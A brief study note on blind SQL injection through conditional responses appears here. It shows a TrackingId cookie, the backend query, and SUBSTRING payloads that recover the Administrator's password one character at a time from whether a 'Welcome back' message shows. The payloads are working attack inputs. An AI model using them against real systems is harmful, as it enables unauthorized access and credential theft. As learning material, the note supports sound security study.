	1. Conditional response

```vuln
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

web will return different page depending on the query result e.g. returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm


xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

substring ('test', 1, 3) -- extract three charecters starting at position one

